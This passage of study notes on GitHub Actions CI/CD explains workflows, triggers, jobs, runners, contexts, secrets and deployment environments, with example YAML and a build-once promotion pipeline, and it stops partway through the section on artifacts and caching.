# CI/CD with GitHub Actions — Complete Study Notes

> Written August 2026. Action versions move fast (checkout is on v7, upload-artifact on v7). Always check the Marketplace page for the current major before copying a version number.

---

## Table of Contents

1. [CI/CD fundamentals](#1-cicd-fundamentals)
2. [GitHub Actions mental model](#2-github-actions-mental-model)
3. [YAML you actually need](#3-yaml-you-actually-need)
4. [Your first workflow](#4-your-first-workflow)
5. [Triggers (events)](#5-triggers-events)
6. [Jobs in depth](#6-jobs-in-depth)
7. [Steps in depth](#7-steps-in-depth)
8. [Runners](#8-runners)
9. [Contexts and expressions](#9-contexts-and-expressions)
10. [Variables and secrets](#10-variables-and-secrets)
11. [Environments — the deep dive](#11-environments--the-deep-dive)
12. [Artifacts vs caching](#12-artifacts-vs-caching)
13. [Matrix builds](#13-matrix-builds)
14. [Reusable workflows and composite actions](#14-reusable-workflows-and-composite-actions)
15. [Writing your own action](#15-writing-your-own-action)
16. [Security](#16-security)
17. [Deployment patterns](#17-deployment-patterns)
18. [Complete real-world examples](#18-complete-real-world-examples)
19. [Debugging and troubleshooting](#19-debugging-and-troubleshooting)
20. [Performance and cost](#20-performance-and-cost)
21. [Common pitfalls](#21-common-pitfalls)
22. [Cheat sheet](#22-cheat-sheet)
23. [Learning path and exercises](#23-learning-path-and-exercises)
24. [Glossary](#24-glossary)

---

## 1. CI/CD fundamentals

### The three terms

**Continuous Integration (CI)** — every push gets automatically built and tested. The goal is to find breakage within minutes of it being introduced, while the change is small and the author still remembers what they did. If your test suite only runs nightly, you're not doing CI.

**Continuous Delivery (CD)** — every commit that passes CI produces a deployable artifact and is automatically pushed as far as a staging environment. Production deploy is a button press, not an engineering project.

**Continuous Deployment (CD)** — same as above, but production deploy happens automatically too, with no human gate. Same acronym, different last word. Most teams do continuous *delivery* to production with a manual approval, and continuous *deployment* to staging.

### Why it matters

| Without CI/CD | With CI/CD |
|---|---|
| "Works on my machine" | Builds in a clean, reproducible environment |
| Bugs found days later | Bugs found in minutes |
| Deploy = scary all-day event | Deploy = routine, several times a day |
| Manual steps get skipped | Steps are code, always run |
| No audit trail | Every deploy logged with who/what/when |

### Anatomy of a typical pipeline

```
Commit → Lint → Build → Unit tests → Integration tests → Security scan
       → Package (Docker image / bundle) → Deploy to dev
       → Deploy to staging → [manual approval] → Deploy to production
       → Smoke tests → Notify
```

**Key principles**

- **Fail fast.** Put cheap checks (lint, typecheck) before expensive ones (e2e tests).
- **Build once, deploy many.** Produce one artifact and promote *that exact artifact* through environments. Never rebuild per environment — you lose the guarantee that what you tested is what you shipped.
- **Idempotent and reproducible.** Running the pipeline twice on the same commit gives the same result.
- **Everything in version control.** Pipeline definitions live in the repo, reviewed like any other code.
- **Fast feedback.** A CI run over ~10 minutes stops being feedback and becomes an interruption.

---

## 2. GitHub Actions mental model

GitHub Actions is GitHub's built-in automation engine. It watches for **events** in your repo and runs **workflows** in response.

### The hierarchy

```
Repository
└── .github/workflows/            ← workflows live here, one YAML file each
    └── ci.yml                    ← a WORKFLOW
        ├── on: push              ← the EVENT that triggers it
        └── jobs:
            ├── build             ← a JOB (runs on its own fresh VM)
            │   ├── step 1        ← a STEP (a shell command, or...)
            │   └── step 2        ← ...an ACTION (reusable packaged code)
            └── deploy            ← another JOB (parallel by default)
```

Precise definitions:

- **Workflow** — a YAML file in `.github/workflows/`. Contains one or more jobs. A repo can have many workflows.
- **Event** — something that happens (push, PR opened, schedule, manual click) that starts a workflow run.
- **Job** — a set of steps that run on the *same* runner, sharing a filesystem. Jobs run **in parallel** unless you declare dependencies with `needs`.
- **Step** — one unit of work inside a job. Either a shell command (`run:`) or a call to an action (`uses:`).
- **Action** — a reusable, packaged unit of code. `actions/checkout` clones your repo; `actions/setup-node` installs Node. Thousands exist on the Marketplace, and you can write your own.
- **Runner** — the machine executing a job. GitHub-hosted (fresh Ubuntu/Windows/macOS VM, destroyed after the job) or self-hosted (your own infra).
- **Workflow run** — a single execution of a workflow, visible under the repo's Actions tab.

### The most important consequence of this design

**Each job gets a brand new, clean machine.** Nothing carries over between jobs — no files, no installed packages, no environment variables set at runtime. If job B needs something job A produced, you must explicitly pass it via **artifacts**, **job outputs**, or a **cache**. This trips up almost every beginner.

### Where it fits vs alternatives

Jenkins (self-managed, ultra-flexible, high maintenance), GitLab CI (very similar model, tied to GitLab), CircleCI / Travis (SaaS, pre-dated Actions). GitHub Actions wins mostly on being *right there* in the repo with zero setup and a huge marketplace.

---

## 3. YAML you actually need

Workflows are YAML. Most Actions failures for beginners are YAML failures.

```yaml
# Key-value
name: My Workflow

# Nesting is by INDENTATION — spaces only, never tabs
jobs:
  build:
    runs-on: ubuntu-latest

# A list uses a dash
steps:
  - name: First
  - name: Second

# A list of maps (each dash starts a new map)
steps:
  - name: Checkout
    uses: actions/checkout@v7
  - name: Install
    run: npm ci

# Multi-line string, keeping newlines (| = literal block)
run: |
  echo "line one"
  echo "line two"

# Multi-line string, folded into one line (>)
description: >
  This becomes a single
  long line of text.

# Booleans, numbers, null
fail-fast: false
timeout-minutes: 30
value: null

# Quoting: needed when a value starts with { or contains :
node-version: '20'          # quote versions or 20.10 becomes a float
if: ${{ github.ref == 'refs/heads/main' }}
name: 'Deploy: production'  # colon inside a value needs quotes

# Comments
# this is a comment
```

**Rules that bite people**

- Tabs are illegal. Configure your editor to insert spaces.
- `on:` is a YAML 1.1 boolean-ish word. GitHub handles it fine, but some linters complain — `"on":` is also valid.
- `'20'` vs `20` matters for versions: `node-version: 20.1` is the number 20.1; `'20.10'` is the string you meant.
- Indentation must be consistent. Two spaces per level is the convention.

**Tooling:** install a YAML extension in your editor, and the GitHub Actions extension for VS Code — it gives you schema validation and autocomplete for workflow syntax. Use `actionlint` for static checking in CI.

---

## 4. Your first workflow

Create `.github/workflows/ci.yml`:

```yaml
name: CI

# WHEN to run
on:
  push:
    branches: [main]
  pull_request:
    branches: [main]

# WHAT to run
jobs:
  test:
    name: Build and test
    runs-on: ubuntu-latest

    steps:
      # 1. Get the code onto the runner (the runner starts empty!)
      - name: Checkout repository
        uses: actions/checkout@v7

      # 2. Install a language runtime
      - name: Set up Node.js
        uses: actions/setup-node@v7
        with:
          node-version: '22'
          cache: 'npm'          # caches ~/.npm keyed on your lockfile

      # 3. Install dependencies (ci = clean, lockfile-exact install)
      - name: Install dependencies
        run: npm ci

      # 4. Run checks
      - name: Lint
        run: npm run lint

      - name: Test
        run: npm test
```

Commit and push. Go to the **Actions** tab and watch it run. Click into the run, then the job, then expand a step to see logs.

### Line-by-line

| Line | Meaning |
|---|---|
| `name:` | Display name in the UI. Optional; defaults to the file path. |
| `on:` | The trigger block. Here: pushes to main, and PRs targeting main. |
| `jobs:` | Map of job IDs to job definitions. `test` is the job ID (used by `needs`). |
| `runs-on:` | Which runner image. `ubuntu-latest` is the cheapest and fastest. |
| `steps:` | Ordered list. Runs top to bottom; stops at the first failure by default. |
| `uses:` | Run a published action. Format `owner/repo@ref`. |
| `with:` | Inputs to that action (like function arguments). |
| `run:` | Execute a shell command on the runner. |

**Why `actions/checkout` is always first:** the runner is a bare VM. Your code is not on it. `checkout` clones the repo at the triggering commit. Forget it and every subsequent step fails with "file not found."

---

## 5. Triggers (events)

### Push

```yaml
on:
  push:
    branches:
      - main
      - 'release/**'          # glob: release/1.0, release/2.x
    branches-ignore:          # can't use with `branches`
      - 'temp/**'
    tags:
      - 'v*.*.*'              # v1.2.3
    paths:                    # only run if these files changed
      - 'src/**'
      - 'package.json'
    paths-ignore:
      - '**.md'
      - 'docs/**'
```

Filters are ANDed across types (branch AND path must match) and ORed within a type.

### Pull request

```yaml
on:
  pull_request:
    types: [opened, synchronize, reopened, ready_for_review]
    branches: [main]
```

Default types are `opened`, `synchronize` (new commits pushed), `reopened`. Other useful ones: `closed`, `labeled`, `review_requested`, `ready_for_review`.

**Important:** for PRs, `GITHUB_SHA` points at a temporary *merge commit* of your PR into the base branch — not your PR head. That's usually what you want (it tests the post-merge state), but it surprises people reading the SHA.

**PRs from forks** run with a read-only `GITHUB_TOKEN` and **no access to secrets**. This is deliberate: otherwise anyone could open a PR that prints your secrets. See [Security](#16-security) for the `pull_request_target` trap.

### Schedule (cron)

```yaml
on:
  schedule:
    - cron: '0 2 * * *'       # 02:00 UTC daily
    - cron: '30 5 * * 1'      # 05:30 UTC every Monday
```

Format: `minute hour day-of-month month day-of-week`. Always **UTC**. Scheduled runs only ever use the workflow file from the **default branch**. Expect delays of 5–15+ minutes during peak load — GitHub queues cron jobs at low priority. Scheduled workflows get **disabled automatically after 60 days of repository inactivity**.

### Manual trigger

```yaml
on:
  workflow_dispatch:
    inputs:
      target:
        description: 'Environment to deploy to'
        required: true
        default: 'staging'
        type: choice
        options: [staging, production]
      version:
        description: 'Version tag'
        required: true
        type: string
      dry_run:
        type: boolean
        default: false
      env_name:
        type: environment       # dropdown of the repo's environments
```

Adds a **Run workflow** button in the Actions tab. Read the values with `${{ inputs.target }}` (or `${{ github.event.inputs.target }}`, the older form). Input types: `string`, `boolean`, `choice`, `environment`. Max 10 inputs. Note that `type: boolean` values arrive as real booleans from `workflow_dispatch` but as **strings** from `workflow_call` — a classic gotcha.

### Other useful events

```yaml
on:
  release:
    types: [published]        # ship on GitHub Release
  issues:
    types: [opened]           # auto-label, auto-reply
  issue_comment:
    types: [created]          # ChatOps: /deploy in a comment
  workflow_run:               # chain workflows
    workflows: ["CI"]
    types: [completed]
    branches: [main]
  repository_dispatch:        # trigger from an external system via API
    types: [deploy-request]
  deployment_status:          # react to deploy success/failure
  workflow_call:              # make this a reusable workflow
```

Trigger `repository_dispatch` from outside GitHub:

```bash
curl -X POST \
  -H "Accept: application/vnd.github+json" \
  -H "Authorization: Bearer $TOKEN" \
  https://api.github.com/repos/OWNER/REPO/dispatches \
  -d '{"event_type":"deploy-request","client_payload":{"env":"prod"}}'
```

### Preventing infinite loops

A workflow's own commits (made with the default `GITHUB_TOKEN`) **do not trigger** other workflows. This prevents runaway loops but also means a bot commit won't kick off CI — if you need that, commit with a PAT or a GitHub App token instead.

---

## 6. Jobs in depth

```yaml
jobs:
  build:
    name: Build (${{ matrix.os }})       # display name, supports expressions
    runs-on: ubuntu-latest
    timeout-minutes: 30                  # default 360 (6 h); always set this
    if: github.event_name == 'push'
    permissions:                         # scope down GITHUB_TOKEN
      contents: read
      packages: write
    env:                                 # job-level env vars
      NODE_ENV: production
    defaults:
      run:
        shell: bash
        working-directory: ./app
    outputs:                             # values other jobs can read
      version: ${{ steps.meta.outputs.version }}
    steps:
      - uses: actions/checkout@v7
      - id: meta
        run: echo "version=1.2.3" >> "$GITHUB_OUTPUT"
```

### Job dependencies with `needs`

```yaml
jobs:
  lint:
    runs-on: ubuntu-latest
    steps: [...]

  test:
    runs-on: ubuntu-latest
    steps: [...]

  build:
    needs: [lint, test]        # waits for BOTH to succeed
    runs-on: ubuntu-latest
    steps: [...]

  deploy:
    needs: build
    runs-on: ubuntu-latest
    steps: [...]
```

This creates a dependency graph (a DAG). `lint` and `test` run in parallel; `build` waits for both. If either fails, `build` and `deploy` are **skipped**.

To run a job even when a dependency failed:

```yaml
  notify:
    needs: [build, deploy]
    if: always()               # or: failure(), or: !cancelled()
    runs-on: ubuntu-latest
```

### Passing data between jobs (outputs)

```yaml
jobs:
  version:
    runs-on: ubuntu-latest
    outputs:
      tag: ${{ steps.gen.outputs.tag }}
    steps:
      - id: gen
        run: echo "tag=v$(date +%Y%m%d)-${GITHUB_SHA::7}" >> "$GITHUB_OUTPUT"

  build:
    needs: version
    runs-on: ubuntu-latest
    steps:
      - run: echo "Building ${{ needs.version.outputs.tag }}"
```

Job outputs are **strings only** and have a 1 MB total limit. For files, use artifacts. Secrets are redacted from outputs.

### Conditional jobs and steps (`if`)

```yaml
# Only on main
if: github.ref == 'refs/heads/main'

# Only on tags
if: startsWith(github.ref, 'refs/tags/v')

# Only for PRs that aren't drafts
if: github.event_name == 'pull_request' && !github.event.pull_request.draft

# Only if a previous step failed
if: failure()

# Only if a label is present
if: contains(github.event.pull_request.labels.*.name, 'deploy')

# Skip for bot commits
if: github.actor != 'dependabot[bot]'
```

`if` at job level is implicitly wrapped in `${{ }}` — you can write it either way, but if the expression starts with `!` you **must** quote it: `if: "!cancelled()"`.

### Concurrency (prevent overlapping runs)

```yaml
concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true
```

At workflow level this cancels the previous run when you push again to the same branch — a big minute-saver. At job level it's essential for deploys:

```yaml
  deploy:
    concurrency:
      group: production-deploy
      cancel-in-progress: false    # queue, never cancel a live deploy
```

Never `cancel-in-progress: true` on a production deploy job; you can leave the target in a half-deployed state.

### Service containers

For integration tests needing a real database:

```yaml
jobs:
  test:
    runs-on: ubuntu-latest
    services:
      postgres:
        image: postgres:16
        env:
          POSTGRES_PASSWORD: postgres
          POSTGRES_DB: testdb
        ports:
          - 5432:5432
        options: >-
          --health-cmd pg_isready
          --health-interval 10s
          --health-timeout 5s
          --health-retries 5
      redis:
        image: redis:7
        ports:
          - 6379:6379
    env:
      DATABASE_URL: postgres://postgres:postgres@localhost:5432/testdb
      REDIS_URL: redis://localhost:6379
    steps:
      - uses: actions/checkout@v7
      - run: npm ci && npm run test:integration
```

The `--health-*` options are important: without them your tests start before Postgres is accepting connections. Address services at `localhost:PORT` when the job runs directly on the runner; use the service *label* as hostname when the job itself runs in a container.

### Running the whole job in a container

```yaml
jobs:
  build:
    runs-on: ubuntu-latest
    container:
      image: node:22-alpine
      env:
        NODE_ENV: test
      volumes:
        - /tmp:/tmp
    steps:
      - uses: actions/checkout@v7
      - run: node --version
```

Useful for exact toolchain reproducibility. Trade-off: image pull time, and some actions assume a normal runner filesystem.

---

## 7. Steps in depth

```yaml
steps:
  - name: Human-readable label            # shows in the UI
    id: build                             # reference via steps.build.*
    if: github.ref == 'refs/heads/main'
    uses: actions/checkout@v7             # EITHER uses...
    with:                                 # ...its inputs
      fetch-depth: 0
    env:
      MY_VAR: value                       # step-scoped env
    continue-on-error: true               # failure doesn't fail the job
    timeout-minutes: 10
    working-directory: ./frontend         # only valid with `run`
    shell: bash                           # only valid with `run`
```

`uses` and `run` are mutually exclusive within one step.

### Forms of `uses`

```yaml
uses: actions/checkout@v7                         # major tag (gets updates)
uses: actions/checkout@v7.0.1                     # exact release
uses: actions/checkout@08c6903cd8c0fde910a37f88322edcfb5dd907a8   # SHA — safest
uses: ./.github/actions/my-local-action           # action in this repo
uses: docker://alpine:3.20                        # Docker image directly
uses: org/repo/path/to/action@main                # subdirectory of a repo
```

### Shells

```yaml
- run: echo "default on Linux/macOS is bash"
- run: echo "default on Windows is pwsh"

- shell: bash        # bash -e {0}
- shell: sh
- shell: pwsh
- shell: powershell  # Windows only
- shell: cmd         # Windows only
- shell: python
- shell: 'bash -eo pipefail {0}'   # custom; recommended for pipelines
```

Default bash runs with `-e` (exit on error) but **not** `pipefail`, so `cat file | grep x` succeeds even if `cat` fails. Add `set -eo pipefail` at the top of important scripts, or set the custom shell above.

### The four magic files

These are the *only* supported way to communicate out of a step. The old `::set-output` / `::set-env` commands are removed.

```bash
# 1. Step output — readable by later steps and job outputs
echo "version=1.2.3" >> "$GITHUB_OUTPUT"

# 2. Environment variable — visible to all LATER steps in this job
echo "BUILD_ID=abc123" >> "$GITHUB_ENV"

# 3. Add to PATH for later steps
echo "/opt/mytool/bin" >> "$GITHUB_PATH"

# 4. Markdown summary shown on the run page
echo "### Test Results :rocket:" >> "$GITHUB_STEP_SUMMARY"
echo "| Suite | Passed |" >> "$GITHUB_STEP_SUMMARY"
echo "|---|---|" >> "$GITHUB_STEP_SUMMARY"
echo "| unit | 142 |" >> "$GITHUB_STEP_SUMMARY"
```

Multi-line values need a heredoc-style delimiter:

```bash
{
  echo 'CHANGELOG<<EOF'
  git log --oneline -10
  echo 'EOF'
} >> "$GITHUB_OUTPUT"
```

Then read them:

```yaml
- id: meta
  run: echo "version=1.2.3" >> "$GITHUB_OUTPUT"
- run: echo "Version is ${{ steps.meta.outputs.version }}"
- run: echo "Build is $BUILD_ID"        # from GITHUB_ENV
```

Note: a variable written to `$GITHUB_ENV` is **not** available in the same step that wrote it.

### Workflow commands

```bash
echo "::notice title=Heads up::Something informational"
echo "::warning file=src/app.js,line=42::Deprecated API"
echo "::error file=src/app.js,line=42,col=8::Build failed here"
echo "::add-mask::$SOME_SECRET"      # redact this string from all logs
echo "::group::Detailed logs"        # collapsible section
echo "  lots of output"
echo "::endgroup::"
```

`::error` and `::warning` with file/line create annotations that appear inline in the PR diff — great for linters.

---

## 8. Runners

### GitHub-hosted

| Label | OS | Notes |
|---|---|---|
| `ubuntu-latest` | Ubuntu (currently 24.04) | Fastest, cheapest, 1× minutes |
| `ubuntu-24.04`, `ubuntu-22.04` | pinned versions | Pin for reproducibility |
| `windows-latest` | Windows Server | **2× minutes** |
| `macos-latest` | macOS (Apple silicon) | **10× minutes** — only for iOS/macOS builds |

Standard spec: 4 vCPU, 16 GB RAM, 14 GB SSD (Linux/Windows). Larger runners (up to 64 cores, GPU) are available on paid plans with custom labels.

Pre-installed: Node, Python, Java, Go, Ruby, .NET, Docker, git, `gh` CLI, AWS/Azure/GCP CLIs, and much more. Each job gets a **fresh, isolated VM** that's destroyed afterwards — nothing persists.

**Billing:** public repos are free. Private repos get a monthly allowance (2,000 minutes on Free, 3,000 on Team, etc.), then per-minute charges with the multipliers above. `ubuntu-latest` is roughly 10× cheaper than `macos-latest` for the same wall-clock time.

### Self-hosted

```yaml
runs-on: self-hosted
runs-on: [self-hosted, linux, x64, gpu]     # all labels must match
```

Use when you need special hardware, huge caches, access to a private network, or lower cost at high volume. You maintain the machine, including cleanup between jobs — state *does* persist, which is both the feature and the danger.

**Security warning:** never attach self-hosted runners to a **public** repository. Anyone can open a PR and run arbitrary code on your machine.

---

## 9. Contexts and expressions

### Expression syntax

`${{ <expression> }}`. Evaluated by GitHub *before* the step runs, and the result is textually substituted in.

### Contexts

| Context | Contains |
|---|---|
| `github` | Event payload, repo, ref, actor, sha, run number… |
| `env` | Env vars set via `env:` blocks |
| `vars` | Configuration variables (repo/org/environment) |
| `secrets` | Secrets |
| `job` | Current job status and service container info |
| `jobs` | (reusable workflows only) outputs of jobs |
| `steps` | Outputs/conclusions of previous steps in this job |
| `runner` | `runner.os`, `runner.arch`, `runner.temp`, `runner.tool_cache` |
| `strategy` | Matrix strategy info (`job-index`, `fail-fast`) |
| `matrix` | Current matrix values |
| `needs` | Outputs and results of dependency jobs |
| `inputs` | Inputs to a reusable workflow or `workflow_dispatch` |

### Most-used `github` properties

```yaml
github.repository            # "octocat/hello-world"
github.repository_owner      # "octocat"
github.ref                   # "refs/heads/main" or "refs/tags/v1.0"
github.ref_name              # "main" or "v1.0"
github.ref_type              # "branch" or "tag"
github.head_ref              # PR source branch (PR events only)
github.base_ref              # PR target branch (PR events only)
github.sha                   # commit SHA
github.actor                 # user who triggered the run
github.triggering_actor      # who re-ran it
github.event_name            # "push", "pull_request", ...
github.event                 # the FULL webhook payload — explore this
github.run_id                # unique run ID (use in URLs)
github.run_number            # incrementing per workflow
github.run_attempt           # 1, 2, 3... on re-runs
github.workspace             # /home/runner/work/repo/repo
github.token                 # the GITHUB_TOKEN
github.server_url            # https://github.com
github.workflow              # workflow name
github.job                   # current job ID
```

**Tip:** to discover what's in the event payload, dump it once:

```yaml
- run: echo '${{ toJSON(github.event) }}'
```

(Better: `echo "$EVENT"` with `env: EVENT: ${{ toJSON(github.event) }}` — see the injection warning in [Security](#16-security).)

### Operators

```yaml
==  !=  <  <=  >  >=      # comparison (loose typing: '1' == 1 is true)
&&  ||  !                 # logic
( )                       # grouping
[ ]  .                    # index / property access
```

There's no ternary, but `&&`/`||` return operands, so this idiom works:

```yaml
${{ github.ref == 'refs/heads/main' && 'production' || 'staging' }}
```

### Built-in functions

```yaml
contains('Hello world', 'world')                  # true
contains(github.event.head_commit.message, 'skip ci')
contains(github.event.pull_request.labels.*.name, 'urgent')
startsWith(github.ref, 'refs/tags/')
endsWith(github.ref, '/main')
format('Hello {0}, you are {1}', 'Bob', 42)
join(github.event.commits.*.id, ', ')
toJSON(github.event)                              # object → JSON string
fromJSON('["a","b"]')                             # JSON string → object
hashFiles('**/package-lock.json')                 # SHA of matched files
```

`fromJSON` is how you build dynamic matrices and convert strings to real types:

```yaml
timeout-minutes: ${{ fromJSON(inputs.timeout) }}   # string → number
```

### Status check functions

```yaml
success()      # all previous steps/jobs succeeded (the implicit default)
failure()      # any previous step/job failed
cancelled()    # the run was cancelled
always()       # run no matter what — even on cancel
```

Prefer `if: !cancelled()` over `if: always()` for cleanup steps, so cancelling a run actually stops it.

---

## 10. Variables and secrets

### Environment variables — three scopes

```yaml
env:
  GLOBAL_VAR: available-everywhere       # workflow level

jobs:
  build:
    env:
      JOB_VAR: available-in-this-job     # job level
    steps:
      - env:
          STEP_VAR: only-this-step       # step level
        run: echo "$GLOBAL_VAR $JOB_VAR $STEP_VAR"
```

Narrower scope wins. Access with shell syntax (`$MY_VAR`) or expression syntax (`${{ env.MY_VAR }}`) — prefer shell syntax inside `run:` blocks for safety.

### Configuration variables (`vars`)

Non-secret settings stored in GitHub UI (Settings → Secrets and variables → Actions → Variables). Available at **organization**, **repository**, and **environment** level.

```yaml
- run: echo "Deploying to ${{ vars.API_BASE_URL }}"
```

Use these for things like region names, feature flags, and URLs — values you want visible in logs and changeable without a commit.

### Secrets

Encrypted values, masked in logs, stored at **organization**, **repository**, or **environment** level.

```yaml
- run: ./deploy.sh
  env:
    API_KEY: ${{ secrets.API_KEY }}
```

**Precedence (most specific wins):** environment secret → repository secret → organization secret. So an `API_KEY` defined on the `production` environment overrides the repo-level `API_KEY` for jobs targeting that environment. This is the mechanism behind per-environment credentials.

**Rules and limits**

- Secrets are write-only in the UI — you can never read them back, only overwrite.
- Max 48 KB per secret; ~100 secrets per repo/environment, 1,000 per org.
- Not passed to workflows triggered by PRs **from forks**.
- Masking is literal-string matching. If your code base64-encodes or JSON-escapes a secret, the transformed version appears in plaintext. Use `::add-mask::` for derived values.
- `secrets.GITHUB_TOKEN` always exists — you never create it.
- Secrets aren't available in `if:` conditions at job level in some contexts; check for emptiness via an env var instead.

### The `GITHUB_TOKEN`

Auto-generated per run, scoped to your repo, expires when the run ends.

```yaml
permissions:
  contents: read          # start from nothing and add what you need
  pull-requests: write
  packages: write
  id-token: write         # required for OIDC
```

Setting any `permissions:` block resets all unlisted scopes to `none`. `permissions: {}` grants nothing. Set `permissions: read-all` or scope per job. Best practice: declare read-only at workflow level, then widen on the specific job that needs it.

Use it via `gh` CLI or the API:

```yaml
- run: gh pr comment ${{ github.event.number }} --body "Build passed ✅"
  env:
    GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
```

---

## 11. Environments — the deep dive

This is the piece most tutorials skim, and it's the heart of safe deployment.

### What an environment is

A **named deployment target** (`development`, `staging`, `production`) configured in **Settings → Environments**. An environment bundles together:

1. **Protection rules** — gates a job must pass before it can start
2. **Environment-scoped secrets** — different credentials per target
3. **Environment-scoped variables** — different config per target
4. **Deployment history** — an audit log of what was deployed, when, by whom

The mental shift: an environment isn't a variable-bag, it's a **policy boundary**. It's how you say "deploying to production requires two approvals, may only happen from main, and uses these credentials."

### Creating one

Settings → Environments → New environment → name it. Then configure:

- **Required reviewers** — up to 6 users/teams; any *one* must approve (unless you enable "prevent self-review"). The job sits in a `waiting` state and the approver gets a notification.
- **Wait timer** — force a delay of 0–43,200 minutes (30 days) before the job starts. Useful as a canary soak period or an "oops window."
- **Prevent self-review** — the person who triggered the run can't approve their own deployment.
- **Deployment branches and tags** — restrict which refs may deploy here:
  - *All branches*
  - *Protected branches only*
  - *Selected branches and tags* — name patterns like `main`, `release/*`, `v*`
- **Custom deployment protection rules** — third-party GitHub Apps that gate deploys (e.g. observability checks, change-management/ITSM approval, on-call status).
- **Environment secrets and variables** — scoped to this environment only.

### Using one in a workflow

```yaml
jobs:
  deploy:
    runs-on: ubuntu-latest
    environment:
      name: production
      url: https://myapp.com          # shown in the UI + deployments API
    steps:
      - run: ./deploy.sh
        env:
          DEPLOY_KEY: ${{ secrets.DEPLOY_KEY }}   # the PRODUCTION one
```

Shorthand when you don't need a URL:

```yaml
    environment: production
```

**What actually happens**

1. The job is created but **does not start**.
2. GitHub checks the deployment-branch policy. Wrong branch → the job fails immediately.
3. If a wait timer is set, the clock runs.
4. If reviewers are required, the run shows "Review pending"; reviewers get notified and can approve or reject with a comment.
5. Only after all gates pass is a runner assigned, and **only then** are environment secrets injected.
6. The URL you set appears on the run page, on the repo's Environments page, and on the PR if applicable.

Point 5 is the real security value: environment secrets are unreachable until the gates pass. A job that can't get approval can never see the production credentials.

### Dynamic environment names

```yaml
jobs:
  deploy:
    environment:
      name: ${{ inputs.target }}            # from workflow_dispatch
      url: ${{ steps.deploy.outputs.url }}  # from a step output
```

```yaml
    # Branch-derived
    environment:
      name: ${{ github.ref == 'refs/heads/main' && 'production' || 'staging' }}
```

For PR preview deployments, a per-PR environment gives you clean tracking:

```yaml
    environment:
      name: pr-${{ github.event.number }}
      url: https://pr-${{ github.event.number }}.preview.myapp.com
```

### A complete promotion pipeline

```yaml
name: Deploy Pipeline

on:
  push:
    branches: [main]

concurrency:
  group: deploy-${{ github.ref }}
  cancel-in-progress: false

permissions:
  contents: read

jobs:
  build:
    runs-on: ubuntu-latest
    outputs:
      version: ${{ steps.meta.outputs.version }}
    steps:
      - uses: actions/checkout@v7
      - uses: actions/setup-node@v7
        with:
          node-version: '22'
          cache: 'npm'
      - run: npm ci
      - run: npm test
      - run: npm run build
      - id: meta
        run: echo "version=${GITHUB_SHA::7}" >> "$GITHUB_OUTPUT"
      # BUILD ONCE — this same artifact is promoted through every environment
      - uses: actions/upload-artifact@v7
        with:
          name: app-${{ steps.meta.outputs.version }}
          path: dist/
          retention-days: 30

  deploy-dev:
    needs: build
    runs-on: ubuntu-latest
    environment:
      name: development
      url: https://dev.myapp.com
    steps:
      - uses: actions/download-artifact@v8
        with:
          name: app-${{ needs.build.outputs.version }}
          path: dist/
      - run: ./scripts/deploy.sh
        env:
          TARGET: ${{ vars.DEPLOY_TARGET }}
          TOKEN: ${{ secrets.DEPLOY_TOKEN }}

  deploy-staging:
    needs: deploy-dev
    runs-on: ubuntu-latest
    environment:
      name: staging
      url: https://staging.myapp.com
    steps:
      - uses: actions/download-artifact@v8
        with:
          name: app-${{ needs.build.outputs.version }}
          path: dist/
      - run: ./scripts/deploy.sh
        env:
          TARGET: ${{ vars.DEPLOY_TARGET }}
          TOKEN: ${{ secrets.DEPLOY_TOKEN }}
      - name: Smoke tests
        run: npm run test:smoke -- --url https://staging.myapp.com

  deploy-production:
    needs: deploy-staging
    runs-on: ubuntu-latest
    environment:                       # ← configured with required reviewers
      name: production
      url: https://myapp.com
    steps:
      - uses: actions/download-artifact@v8
        with:
          name: app-${{ needs.build.outputs.version }}
          path: dist/
      - run: ./scripts/deploy.sh
        env:
          TARGET: ${{ vars.DEPLOY_TARGET }}
          TOKEN: ${{ secrets.DEPLOY_TOKEN }}
      - name: Verify
        run: curl -fsS https://myapp.com/health
```

Notice `vars.DEPLOY_TARGET` and `secrets.DEPLOY_TOKEN` are written **identically** in all three deploy jobs. Each environment supplies its own values. The workflow stays DRY; the differences live in configuration. This is the pattern to internalize.

### Environments vs plain secrets — when to use which

| Need | Use |
|---|---|
| Same value everywhere (e.g. Slack webhook for CI alerts) | Repository secret |
| Different value per target (prod vs staging DB password) | Environment secrets |
| Human approval before deploy | Environment with required reviewers |
| Only `main` may reach production | Environment with deployment branch policy |
| Audit trail of deployments | Environment (gives you deployment history) |
| Shared across many repos | Organization secret/variable |

### Environments + branch protection = defence in depth

They protect different things:

- **Branch protection** guards the *code*: required reviews and status checks before merge.
- **Environment protection** guards the *deployment*: approval and ref policy before the deploy job runs.

Use both. Branch protection stops bad code getting into main; environment protection stops even good code reaching production unreviewed.

### Availability and limits

- Environments are available in all public repositories on every plan.
- For **private or internal** repositories, environment **protection rules** and **environment secrets** require GitHub Pro, Team, or Enterprise. On the Free plan with a private repo you can create environments but not gate them.
- Wait timer max: 43,200 minutes (30 days).
- Required reviewers max: 6 users or teams.
- A job with an `environment:` whose approval never arrives will eventually time out (runs are capped at 35 days).

### Managing environments via API / CLI

```bash
# List environments
gh api repos/:owner/:repo/environments

# Create/update an environment with a wait timer
gh api -X PUT repos/:owner/:repo/environments/staging -f wait_timer=5

# Set an environment secret
gh secret set DEPLOY_TOKEN --env production --body "$VALUE"

# Set an environment variable
gh variable set DEPLOY_TARGET --env production --body "prod-cluster"

# View deployment history
gh api repos/:owner/:repo/deployments
```

---

## 12. Artifacts vs caching

They look similar and solve different problems. Getting this wrong is the most common architectural mistake in Actions.

| | **Artifacts** | **Cache** |
|---|---|---|
| Purpose | Pass *outputs* between jobs; keep build results | Speed up *repeat* runs |
| Correctness | Pipeline breaks if missing | Pipeline still works if missing (just slower) |
| Downloadable by humans | Yes, from the run page | No |
| Lifetime | 1–90 days (default 90) | Evicted after 7 days unused, or when repo exceeds 10 GB |
| Scope | The workflow run | The repo, with branch scoping rules |
| Typical content | Compiled binaries, test reports, coverage, Docker tarballs | `~/.npm`, `~/.m2`, `~/.cargo`, `node_modules` |

**Rule of thumb:** if losing it breaks the pipeline, it's an artifact. If losing it only makes it slower, it's a cache.

### Artifacts

```yaml
- uses: actions/upload-artifact@v7
  with:
    name: build-output
    path: |
      dist/
      !dist/**/*.map          # exclusions with !
    retention-days: 14
    if-no-files-found: error  # warn (default) | error | ignore
    compression-level: 6      # 0-9
    include-hidden-files: false
    overwrite: false

- uses: actions/download-artifact@v8
  with:
    name: build-output
    path: dist/

# Download ALL artifacts from this run
- uses: actions/download-artifact@v8

